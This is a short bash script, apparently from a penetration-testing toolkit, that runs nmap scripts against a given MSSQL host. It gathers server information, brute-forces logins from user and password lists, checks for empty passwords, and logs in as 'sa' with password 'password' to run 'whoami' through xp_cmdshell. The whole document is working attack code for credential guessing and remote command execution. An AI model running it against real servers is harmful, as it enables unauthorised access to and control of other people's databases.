#!/bin/bash
# Recon MSSQL with nmap
SCRIPT_DIR=$(dirname $0)
cd ${SCRIPT_DIR}
SCRIPT_BASE=$(pwd)

if [ -z ${1} ]; then
    echo "Usage: ${0} <hostname>"
    exit
fi

sudo nmap -sU -p1434 --script=ms-sql-info.nse ${1} -P0
sudo nmap -p1433 --script ms-sql-brute --script-args userdb=.users.txt,passdb=.pass.txt ${1} -P0
sudo nmap -p1433 --script ms-sql-empty-password ${1} -P0
sudo nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=password,ms-sql-xp-cmdshell.cmd="whoami" ${1}
